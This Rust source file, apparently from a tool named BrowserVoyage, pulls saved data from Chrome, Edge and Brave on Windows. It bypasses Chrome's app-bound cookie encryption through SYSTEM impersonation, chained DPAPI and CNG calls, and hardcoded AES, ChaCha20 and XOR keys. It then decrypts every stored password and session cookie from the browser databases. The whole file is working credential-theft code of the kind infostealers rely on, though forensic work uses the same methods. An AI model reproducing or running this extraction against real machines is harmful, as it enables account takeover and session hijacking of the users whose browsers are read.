use crate::browser_extractor::{
    BrowserExtractor, BrowserInfo, Cookie, Credential, ExtractedData, ProfileData,
};
use crate::error::{convert_windows_error, BrowserVoyageError, BrowserVoyageResult};
use crate::windows::ImpersonationGuard;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chacha20poly1305::ChaCha20Poly1305;
use hex;
use rusqlite::Connection;
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::env;
use std::fs;
use std::path::PathBuf;
use tracing::{debug, info, instrument};
use windows::core::w;
use windows::Win32::Security::Cryptography::{
    CryptUnprotectData, NCryptDecrypt, NCryptFreeObject, NCryptOpenKey, NCryptOpenStorageProvider,
    CERT_KEY_SPEC, CRYPT_INTEGER_BLOB, NCRYPT_FLAGS, NCRYPT_KEY_HANDLE, NCRYPT_PROV_HANDLE,
};

#[derive(Debug)]
struct ParsedKeyBlob {
    _header: Vec<u8>,
    flag: u8,
    iv: Vec<u8>,
    ciphertext: Vec<u8>,
    tag: Vec<u8>,
    encrypted_aes_key: Option<Vec<u8>>,
}

#[derive(Debug, Deserialize)]
struct LocalState {
    os_crypt: OsCrypt,
}

#[derive(Debug, Deserialize)]
struct OsCrypt {
    app_bound_encrypted_key: Option<String>,
    encrypted_key: Option<String>,
}

#[derive(Debug)]
pub struct WindowsChromeExtractor {
    user_data_path: PathBuf,
    browser_name: String,
}

impl WindowsChromeExtractor {
    pub fn new(browser_name: &str) -> Self {
        let user_data_path = Self::get_user_data_path(browser_name);

        Self {
            user_data_path,
            browser_name: browser_name.to_string(),
        }
    }

    pub fn chrome() -> Self {
        Self::new("Chrome")
    }

    pub fn edge() -> Self {
        Self::new("Edge")
    }

    pub fn brave() -> Self {
        Self::new("Brave")
    }

    fn get_user_data_path(browser_name: &str) -> PathBuf {
        let user_profile = env::var("USERPROFILE").unwrap_or_default();
        let base_path = PathBuf::from(&user_profile);

        match browser_name {
            "Chrome" => base_path.join("AppData/Local/Google/Chrome/User Data"),
            "Edge" => base_path.join("AppData/Local/Microsoft/Edge/User Data"),
            "Brave" => base_path.join("AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            _ => base_path.join(format!("AppData/Local/{}/User Data", browser_name)),
        }
    }

    #[instrument(skip(blob_data))]
    fn parse_key_blob(&self, blob_data: &[u8]) -> BrowserVoyageResult<ParsedKeyBlob> {
        let mut cursor = 0;

        if blob_data.len() < 8 {
            return Err(BrowserVoyageError::ParseError("Blob data too short".into()));
        }

        let header_len =
            u32::from_le_bytes(blob_data[cursor..cursor + 4].try_into().map_err(|_| {
                BrowserVoyageError::ParseError("Failed to parse header length".into())
            })?) as usize;
        cursor += 4;

        if cursor + header_len > blob_data.len() {
            return Err(BrowserVoyageError::ParseError(
                "Invalid header length".into(),
            ));
        }

        let header = blob_data[cursor..cursor + header_len].to_vec();
        cursor += header_len;

        let content_len =
            u32::from_le_bytes(blob_data[cursor..cursor + 4].try_into().map_err(|_| {
                BrowserVoyageError::ParseError("Failed to parse content length".into())
            })?) as usize;
        cursor += 4;

        if header_len + content_len + 8 != blob_data.len() {
            return Err(BrowserVoyageError::ParseError(
                "Invalid blob structure".into(),
            ));
        }

        let flag = blob_data[cursor];
        cursor += 1;

        debug!("Parsing key blob with flag: {}", flag);

        let mut parsed = ParsedKeyBlob {
            _header: header,
            flag,
            iv: Vec::new(),
            ciphertext: Vec::new(),
            tag: Vec::new(),
            encrypted_aes_key: None,
        };

        match flag {
            1 | 2 => {
                if cursor + 12 + 32 + 16 > blob_data.len() {
                    return Err(BrowserVoyageError::ParseError(format!(
                        "Invalid data for flag {flag}"
                    )));
                }
                parsed.iv = blob_data[cursor..cursor + 12].to_vec();
                cursor += 12;
                parsed.ciphertext = blob_data[cursor..cursor + 32].to_vec();
                cursor += 32;
                parsed.tag = blob_data[cursor..cursor + 16].to_vec();
            }
            3 => {
                if cursor + 32 + 12 + 32 + 16 > blob_data.len() {
                    return Err(BrowserVoyageError::ParseError(
                        "Invalid data for flag 3".into(),
                    ));
                }
                parsed.encrypted_aes_key = Some(blob_data[cursor..cursor + 32].to_vec());
                cursor += 32;
                parsed.iv = blob_data[cursor..cursor + 12].to_vec();
                cursor += 12;
                parsed.ciphertext = blob_data[cursor..cursor + 32].to_vec();
                cursor += 32;
                parsed.tag = blob_data[cursor..cursor + 16].to_vec();
            }
            _ => {
                return Err(BrowserVoyageError::ParseError(format!(
                    "Unsupported flag: {flag}"
                )))
            }
        }

        Ok(parsed)
    }

    #[instrument(skip(input_data))]
    fn decrypt_with_cng(&self, input_data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
        unsafe {
            let mut h_provider = NCRYPT_PROV_HANDLE::default();
            let provider_name = w!("Microsoft Software Key Storage Provider");

            NCryptOpenStorageProvider(&mut h_provider, provider_name, 0)
                .map_err(convert_windows_error)?;

            let mut h_key = NCRYPT_KEY_HANDLE::default();
            let key_name = w!("Google Chromekey1");

            NCryptOpenKey(
                h_provider,
                &mut h_key,
                key_name,
                CERT_KEY_SPEC(0),
                NCRYPT_FLAGS(0),
            )
            .map_err(convert_windows_error)?;

            let mut pcb_result = 0u32;
            NCryptDecrypt(
                h_key,
                Some(input_data),
                None,
                None,
                &mut pcb_result,
                NCRYPT_FLAGS(0x40), // NCRYPT_SILENT_FLAG
            )
            .map_err(convert_windows_error)?;

            let mut output = vec![0u8; pcb_result as usize];
            NCryptDecrypt(
                h_key,
                Some(input_data),
                None,
                Some(&mut output),
                &mut pcb_result,
                NCRYPT_FLAGS(0x40), // NCRYPT_SILENT_FLAG
            )
            .map_err(convert_windows_error)?;

            NCryptFreeObject(windows::Win32::Security::Cryptography::NCRYPT_HANDLE(
                h_key.0,
            ))
            .ok();
            NCryptFreeObject(windows::Win32::Security::Cryptography::NCRYPT_HANDLE(
                h_provider.0,
            ))
            .ok();

            output.truncate(pcb_result as usize);
            debug!("Successfully decrypted {} bytes with CNG", output.len());
            Ok(output)
        }
    }

    fn byte_xor(&self, ba1: &[u8], ba2: &[u8]) -> Vec<u8> {
        ba1.iter().zip(ba2.iter()).map(|(a, b)| a ^ b).collect()
    }

    #[instrument(skip(parsed_data))]
    fn derive_v20_master_key(&self, parsed_data: &ParsedKeyBlob) -> BrowserVoyageResult<Vec<u8>> {
        match parsed_data.flag {
            1 => {
                info!("Using AES-256-GCM decryption (flag 1)");
                let aes_key = hex::decode(
                    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787",
                )?;
                let cipher = Aes256Gcm::new_from_slice(&aes_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES: {e}")))
            }
            2 => {
                info!("Using ChaCha20-Poly1305 decryption (flag 2)");
                let chacha20_key = hex::decode(
                    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660",
                )?;
                let cipher = ChaCha20Poly1305::new_from_slice(&chacha20_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = chacha20poly1305::Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("ChaCha20: {e}")))
            }
            3 => {
                info!("Using AES-256-GCM with CNG decryption (flag 3)");
                let xor_key = hex::decode(
                    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390",
                )?;

                let encrypted_aes_key =
                    parsed_data.encrypted_aes_key.as_ref().ok_or_else(|| {
                        BrowserVoyageError::ParseError(
                            "Missing encrypted AES key for flag 3".into(),
                        )
                    })?;

                let _guard = ImpersonationGuard::new()?;
                let decrypted_aes_key = self.decrypt_with_cng(encrypted_aes_key)?;

                let xored_aes_key = self.byte_xor(&decrypted_aes_key, &xor_key);
                let cipher = Aes256Gcm::new_from_slice(&xored_aes_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES: {e}")))
            }
            _ => Err(BrowserVoyageError::ParseError(format!(
                "Unsupported flag: {}",
                parsed_data.flag
            ))),
        }
    }

    #[instrument(skip(data))]
    fn dpapi_unprotect(&self, data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
        unsafe {
            let data_in = CRYPT_INTEGER_BLOB {
                cbData: data.len() as u32,
                pbData: data.as_ptr() as *mut u8,
            };

            let mut data_out = CRYPT_INTEGER_BLOB::default();

            CryptUnprotectData(&data_in, None, None, None, None, 0, &mut data_out)
                .map_err(convert_windows_error)?;

            let result =
                std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();

            #[link(name = "kernel32")]
            extern "system" {
                fn LocalFree(hMem: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
            }

            LocalFree(data_out.pbData as *mut std::ffi::c_void);

            debug!("DPAPI decrypted {} bytes", result.len());
            Ok(result)
        }
    }

    #[instrument(skip(encrypted_value, master_key))]
    fn decrypt_chromium_value(
        &self,
        encrypted_value: &[u8],
        master_key: &[u8],
        host_key: Option<&str>,
    ) -> BrowserVoyageResult<String> {
        debug!(
            "decrypt_chromium_value for {}: encrypted_value len={}, master_key len={}, host_key={:?}",
            self.browser_name,
            encrypted_value.len(),
            master_key.len(),
            host_key
        );

        if encrypted_value.len() < 3 + 12 + 16 {
            return Err(BrowserVoyageError::ParseError(
                "Invalid encrypted value length".into(),
            ));
        }

        // Check for v10, v11, or v20 prefix (different Chrome versions)
        if &encrypted_value[..3] != b"v20"
            && &encrypted_value[..3] != b"v10"
            && &encrypted_value[..3] != b"v11"
        {
            return Err(BrowserVoyageError::ParseError(format!(
                "Unknown encryption prefix: {:?}",
                String::from_utf8_lossy(&encrypted_value[..3])
            )));
        }

        let nonce = &encrypted_value[3..15];
        let ciphertext = &encrypted_value[15..];

        debug!(
            "Decryption details for {}: nonce len={}, ciphertext len={}, master_key={}...{}",
            self.browser_name,
            nonce.len(),
            ciphertext.len(),
            hex::encode(&master_key[..4.min(master_key.len())]),
            hex::encode(&master_key[master_key.len().saturating_sub(4)..])
        );

        // Log hex content of nonce and first/last parts of ciphertext for debugging
        debug!(
            "Hex details for {}: nonce={}, ciphertext_start={}, ciphertext_end={}",
            self.browser_name,
            hex::encode(nonce),
            hex::encode(&ciphertext[..8.min(ciphertext.len())]),
            hex::encode(&ciphertext[ciphertext.len().saturating_sub(8)..])
        );

        let cipher = Aes256Gcm::new_from_slice(master_key)
            .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
        let nonce = Nonce::from_slice(nonce);

        debug!("Attempting AES-GCM decryption for {}", self.browser_name);

        // Use standard AES-GCM decryption (no AAD) for all formats
        debug!("Using standard AES-GCM decryption (no AAD)");
        let decrypted = match cipher.decrypt(nonce, ciphertext) {
            Ok(result) => result,
            Err(e) => {
                debug!("AES-GCM decryption failed for {}: {}", self.browser_name, e);

                // For v20 cookies that fail with 32-byte key, try alternative keys
                if &encrypted_value[..3] == b"v20"
                    && (self.browser_name == "Edge" || self.browser_name == "Brave")
                {
                    debug!(
                        "Trying v20 decryption with alternative keys for {}",
                        self.browser_name
                    );

                    // Try app_bound_encrypted_key approach (like Chrome uses)
                    if let Ok(alt_key) = self.get_app_bound_key_for_v20() {
                        debug!(
                            "Attempting v20 decryption with app_bound key ({} bytes)",
                            alt_key.len()
                        );
                        if alt_key.len() == 32 {
                            let alt_cipher = Aes256Gcm::new_from_slice(&alt_key).ok();
                            if let Some(alt_cipher) = alt_cipher {
                                if let Ok(result) = alt_cipher.decrypt(nonce, ciphertext) {
                                    debug!("v20 decryption successful with app_bound key");
                                    // Handle binary cookie data gracefully
                                    return match String::from_utf8(result.clone()) {
                                        Ok(s) => Ok(s),
                                        Err(_) => {
                                            debug!(
                                                "Cookie contains binary data, encoding as base64"
                                            );
                                            Ok(BASE64.encode(&result))
                                        }
                                    };
                                } else {
                                    debug!("v20 decryption also failed with app_bound key");
                                }
                            }
                        }
                    }
                }

                return Err(BrowserVoyageError::DecryptionFailed(format!(
                    "AES-GCM: {e}"
                )));
            }
        };

        debug!(
            "AES-GCM decryption successful for {}, decrypted len={}",
            self.browser_name,
            decrypted.len()
        );

        // For Edge/Brave, use simple decryption like the user's function
        if self.browser_name == "Edge" || self.browser_name == "Brave" {
            debug!(
                "Using simple decryption for {} (no domain hash validation)",
                self.browser_name
            );
            // Handle binary cookie data gracefully
            return match String::from_utf8(decrypted.clone()) {
                Ok(s) => Ok(s),
                Err(_) => {
                    debug!("Cookie contains binary data, encoding as base64");
                    Ok(BASE64.encode(&decrypted))
                }
            };
        }

        // Special handling for Chrome cookies: validate the domain hash
        if let Some(host) = host_key {
            // Calculate SHA-256 hash of the domain
            let mut hasher = Sha256::new();
            hasher.update(host.as_bytes());
            let computed_hash = hasher.finalize();

            // If the first 32 bytes match the domain hash, extract the actual cookie value
            if decrypted.len() >= 32 && computed_hash.as_slice() == &decrypted[..32] {
                debug!(
                    "Domain hash verification passed for {}, stripping 32-byte prefix",
                    host
                );
                return Ok(String::from_utf8(decrypted[32..].to_vec())?);
            } else {
                debug!("Domain hash verification failed or not present for {}, using full decrypted content", host);
            }
        }

        // Convert the decrypted binary data to a UTF-8 string (for passwords or cookies without domain hash)
        Ok(String::from_utf8(decrypted)?)
    }

    fn extract_master_key(&self) -> BrowserVoyageResult<Vec<u8>> {
        let local_state_path = self.user_data_path.join("Local State");

        info!("Reading {} Local State file", self.browser_name);
        let local_state_content = fs::read_to_string(&local_state_path)
            .map_err(|e| BrowserVoyageError::Io(format!("Failed to read Local State: {e}")))?;
        let local_state: LocalState = serde_json::from_str(&local_state_content)?;

        match self.browser_name.as_str() {
            "Chrome" => self.extract_chrome_master_key(&local_state.os_crypt),
            "Edge" | "Brave" => self.extract_simple_master_key(&local_state.os_crypt),
            _ => Err(BrowserVoyageError::ParseError(format!(
                "Unsupported browser: {}",
                self.browser_name
            ))),
        }
    }

    fn extract_chrome_master_key(&self, os_crypt: &OsCrypt) -> BrowserVoyageResult<Vec<u8>> {
        let app_bound_encrypted_key =
            os_crypt.app_bound_encrypted_key.as_ref().ok_or_else(|| {
                BrowserVoyageError::ParseError("Missing app_bound_encrypted_key for Chrome".into())
            })?;

        let key_blob_encrypted_with_prefix = BASE64
            .decode(app_bound_encrypted_key)
            .map_err(|_| BrowserVoyageError::Base64Error)?;

        if key_blob_encrypted_with_prefix.len() < 4
            || &key_blob_encrypted_with_prefix[..4] != b"APPB"
        {
            return Err(BrowserVoyageError::ParseError(
                "Invalid app_bound_encrypted_key prefix".into(),
            ));
        }

        let key_blob_encrypted = &key_blob_encrypted_with_prefix[4..];

        info!("Decrypting with SYSTEM DPAPI");
        let _guard = ImpersonationGuard::new()?;
        let key_blob_system_decrypted = self.dpapi_unprotect(key_blob_encrypted)?;
        drop(_guard);

        info!("Decrypting with user DPAPI");
        let key_blob_user_decrypted = self.dpapi_unprotect(&key_blob_system_decrypted)?;

        let parsed_data = self.parse_key_blob(&key_blob_user_decrypted)?;
        self.derive_v20_master_key(&parsed_data)
    }

    fn extract_simple_master_key(&self, os_crypt: &OsCrypt) -> BrowserVoyageResult<Vec<u8>> {
        // First try the standard Edge/Brave approach
        if let Some(encrypted_key) = &os_crypt.encrypted_key {
            if let Ok(key) = self.try_standard_dpapi_approach(encrypted_key) {
                return Ok(key);
            }
            debug!(
                "Standard DPAPI approach failed for {}, trying Edge browser approach",
                self.browser_name
            );
        }

        // Fallback: Try Edge browser approach using Chrome's system-user DPAPI method
        if let Some(app_bound_encrypted_key) = &os_crypt.app_bound_encrypted_key {
            if let Ok(key) = self.try_edge_browser_approach(app_bound_encrypted_key) {
                return Ok(key);
            }
        }

        Err(BrowserVoyageError::ParseError(format!(
            "Failed to extract master key for {} using any available method",
            self.browser_name
        )))
    }

    fn try_standard_dpapi_approach(&self, encrypted_key: &str) -> BrowserVoyageResult<Vec<u8>> {
        let key_with_prefix = BASE64
            .decode(encrypted_key)
            .map_err(|_| BrowserVoyageError::Base64Error)?;

        if key_with_prefix.len() < 5 || &key_with_prefix[..5] != b"DPAPI" {
            return Err(BrowserVoyageError::ParseError(
                "Invalid encrypted_key prefix".into(),
            ));
        }

        let encrypted_key_data = &key_with_prefix[5..];

        info!("Decrypting {} key with user DPAPI only", self.browser_name);
        let decrypted_content = self.dpapi_unprotect(encrypted_key_data)?;

        // Store full decrypted content for potential v20 cookie decryption
        // For now, still return last 32 bytes as primary key
        if decrypted_content.len() < 32 {
            return Err(BrowserVoyageError::ParseError(format!(
                "DPAPI decrypted content too short for {}: expected at least 32 bytes, got {}",
                self.browser_name,
                decrypted_content.len()
            )));
        }

        let state_key = decrypted_content[decrypted_content.len() - 32..].to_vec();

        debug!(
            "Successfully extracted {} master key using standard approach (last 32 bytes of {} total)",
            self.browser_name,
            decrypted_content.len()
        );
        Ok(state_key)
    }

    fn get_app_bound_key_for_v20(&self) -> BrowserVoyageResult<Vec<u8>> {
        let local_state_path = self.user_data_path.join("Local State");
        let local_state_content = fs::read_to_string(&local_state_path)
            .map_err(|e| BrowserVoyageError::Io(format!("Failed to read Local State: {e}")))?;

        let local_state: LocalState = serde_json::from_str(&local_state_content).map_err(|e| {
            BrowserVoyageError::ParseError(format!("Failed to parse Local State: {e}"))
        })?;

        if let Some(app_bound_encrypted_key) = &local_state.os_crypt.app_bound_encrypted_key {
            debug!("Attempting to use app_bound_encrypted_key for v20 decryption (Chrome method)");
            // Use Chrome's complex key derivation method
            self.try_edge_browser_approach(app_bound_encrypted_key)
        } else {
            Err(BrowserVoyageError::ParseError(
                "No app_bound_encrypted_key found for v20 fallback".into(),
            ))
        }
    }

    fn try_edge_browser_approach(
        &self,
        app_bound_encrypted_key: &str,
    ) -> BrowserVoyageResult<Vec<u8>> {
        info!(
            "Attempting Edge browser approach for {} (system-user DPAPI + last 32 bytes)",
            self.browser_name
        );

        let key_blob_encrypted_with_prefix = BASE64
            .decode(app_bound_encrypted_key)
            .map_err(|_| BrowserVoyageError::Base64Error)?;

        if key_blob_encrypted_with_prefix.len() < 4
            || &key_blob_encrypted_with_prefix[..4] != b"APPB"
        {
            return Err(BrowserVoyageError::ParseError(
                "Invalid app_bound_encrypted_key prefix".into(),
            ));
        }

        let key_blob_encrypted = &key_blob_encrypted_with_prefix[4..];

        // Try system-user DPAPI approach like Chrome but take last 32 bytes
        let _guard = ImpersonationGuard::new()?;
        let key_blob_system_decrypted = self.dpapi_unprotect(key_blob_encrypted)?;
        drop(_guard);

        let key_blob_user_decrypted = self.dpapi_unprotect(&key_blob_system_decrypted)?;

        // Try Edge browser approach: use the last 32 bytes of decrypted key directly
        if key_blob_user_decrypted.len() >= 32 {
            let state_key = key_blob_user_decrypted[key_blob_user_decrypted.len() - 32..].to_vec();
            debug!(
                "Successfully extracted {} master key using Edge browser approach (last 32 bytes of {} total)",
                self.browser_name,
                key_blob_user_decrypted.len()
            );
            Ok(state_key)
        } else {
            Err(BrowserVoyageError::ParseError(format!(
                "System-user DPAPI decrypted content too short for Edge approach: expected at least 32 bytes, got {}",
                key_blob_user_decrypted.len()
            )))
        }
    }

    fn extract_cookies(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Cookie>> {
        let cookie_db_path = self.user_data_path.join("Default/Network/Cookies");

        info!("Connecting to {} cookie database", self.browser_name);
        let conn = Connection::open_with_flags(
            &cookie_db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )?;

        let mut stmt =
            conn.prepare("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure from cookies")?;
        let cookies = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?,
                row.get::<_, bool>(5)?,
            ))
        })?;

        let mut extracted_cookies = Vec::new();
        let mut total_cookies = 0;
        let mut encrypted_cookies = 0;
        let mut non_prefixed_cookies = 0;

        for cookie in cookies {
            let (host_key, name, encrypted_value, path, expiry, is_secure) = cookie?;
            total_cookies += 1;

            if encrypted_value.is_empty() {
                debug!(
                    "Skipping cookie {}/{} - empty encrypted_value",
                    host_key, name
                );
                continue;
            }

            debug!(
                "Processing cookie {}/{}: encrypted_value length = {}, first 3 bytes = {:?}",
                host_key,
                name,
                encrypted_value.len(),
                if encrypted_value.len() >= 3 {
                    String::from_utf8_lossy(&encrypted_value[..3])
                } else {
                    "N/A".into()
                }
            );

            if encrypted_value.len() > 3
                && (&encrypted_value[..3] == b"v20"
                    || &encrypted_value[..3] == b"v10"
                    || &encrypted_value[..3] == b"v11")
            {
                encrypted_cookies += 1;

                // Log full encrypted_value for debugging
                debug!(
                    "Cookie {}/{} encrypted_value (full hex): {}",
                    host_key,
                    name,
                    hex::encode(&encrypted_value)
                );

                match self.decrypt_chromium_value(&encrypted_value, master_key, Some(&host_key)) {
                    Ok(decrypted_value) => {
                        debug!("Successfully decrypted cookie {}/{}", host_key, name);
                        extracted_cookies.push(Cookie {
                            host: host_key.clone(),
                            name,
                            value: decrypted_value,
                            path,
                            expiry,
                            is_secure,
                        });
                    }
                    Err(e) => {
                        debug!("Failed to decrypt cookie {}/{}: {}", host_key, name, e);
                    }
                }
            } else {
                non_prefixed_cookies += 1;
                debug!(
                    "Skipping cookie {}/{} - no recognized encryption prefix",
                    host_key, name
                );
            }
        }

        debug!("Cookie processing summary for {}: total={}, encrypted={}, non-prefixed={}, extracted={}", 
               self.browser_name, total_cookies, encrypted_cookies, non_prefixed_cookies, extracted_cookies.len());

        info!("Successfully extracted {} cookies", extracted_cookies.len());
        Ok(extracted_cookies)
    }

    fn extract_credentials(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Credential>> {
        let login_db_path = self.user_data_path.join("Default/Login Data");

        if !login_db_path.exists() {
            debug!("Login Data database not found at: {:?}", login_db_path);
            return Ok(Vec::new());
        }

        info!("Connecting to {} Login Data database", self.browser_name);

        // Try to copy the database file if it's locked
        let temp_path = std::env::temp_dir().join(format!(
            "{}_login_data_temp.db",
            self.browser_name.to_lowercase()
        ));
        let db_path = if Connection::open_with_flags(
            &login_db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .is_err()
        {
            // Database is locked, copy it
            std::fs::copy(&login_db_path, &temp_path)
                .map_err(|e| BrowserVoyageError::Io(format!("Failed to copy Login Data: {e}")))?;
            &temp_path
        } else {
            &login_db_path
        };

        let conn =
            Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)?;

        let mut stmt =
            conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
        let credentials = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        })?;

        let mut extracted_credentials = Vec::new();

        for credential in credentials {
            let (origin_url, username, encrypted_password) = credential?;

            if !encrypted_password.is_empty()
                && !origin_url.is_empty()
                && encrypted_password.len() > 3
                && (&encrypted_password[..3] == b"v20"
                    || &encrypted_password[..3] == b"v10"
                    || &encrypted_password[..3] == b"v11")
            {
                // Log full encrypted_password for debugging
                debug!(
                    "Credential {} encrypted_password (full hex): {}",
                    origin_url,
                    hex::encode(&encrypted_password)
                );

                match self.decrypt_chromium_value(&encrypted_password, master_key, None) {
                    Ok(decrypted_password) => {
                        extracted_credentials.push(Credential {
                            url: origin_url,
                            username,
                            password: decrypted_password,
                        });
                    }
                    Err(e) => {
                        debug!("Failed to decrypt password for {}: {}", origin_url, e);
                    }
                }
            }
        }

        // Clean up temp file if we used it
        if db_path == &temp_path {
            let _ = std::fs::remove_file(&temp_path);
        }

        info!(
            "Successfully extracted {} credentials",
            extracted_credentials.len()
        );
        Ok(extracted_credentials)
    }
}

impl BrowserExtractor for WindowsChromeExtractor {
    fn name(&self) -> &str {
        &self.browser_name
    }

    fn extract(&mut self) -> BrowserVoyageResult<ExtractedData> {
        let master_key = self.extract_master_key()?;
        let cookies = self.extract_cookies(&master_key)?;
        let credentials = self.extract_credentials(&master_key)?;

        let profile_data = ProfileData {
            name: "Default".to_string(),
            path: self.user_data_path.join("Default").display().to_string(),
            cookies,
            credentials,
        };

        Ok(ExtractedData {
            browser: BrowserInfo {
                name: self.browser_name.clone(),
                vendor: match self.browser_name.as_str() {
                    "Chrome" => "Google".to_string(),
                    "Edge" => "Microsoft".to_string(),
                    "Brave" => "Brave Software".to_string(),
                    _ => "Unknown".to_string(),
                },
                platform: "Windows".to_string(),
            },
            profiles: vec![profile_data],
        })
    }
}
